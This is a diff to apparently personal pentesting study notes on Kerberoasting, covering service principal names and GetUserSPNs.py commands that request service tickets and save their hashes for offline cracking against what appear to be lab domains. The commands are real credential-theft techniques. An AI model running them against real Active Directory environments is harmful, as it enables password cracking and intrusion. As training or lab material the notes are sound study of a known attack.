@@ -1,6 +1,7 @@
 - Attack against **service accounts** (accounts with SPNs) or accounts that are running services 
 - Request service tickets for accounts and crack them offline
 - Works because service tickets are encrypted with the **service account's password hash**
+- **requires valid domain credentials**.
 
 SPN = Service Principal Name
 - It’s basically a **unique identifier**  for a   **service** (like MSSQL, HTTP, CIFS, LDAP) to the user or computer account running it.
@@ -17,7 +18,10 @@ GetUserSPNs.py:
 ```sh
 #Since our Kali machine is not joined to the domain, we also must provide domain user credentials to obtain the TGS-REP hash
 #we user a any domain user
-impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+GetUserSPNs.py EGOTISTICAL-BANK.LOCAL/<user>:<password> -dc-ip <dc-ip> -request -outputfile kerb.txt
+
+#kerberos
+GetUserSPNs.py -k -no-pass -dc-host dc1.scrm.local <Domain>/<victimUser> -request
 
 #$krb5tgs$23$*iis_service$CORP.COM$corp.com/
 #user iss_service 
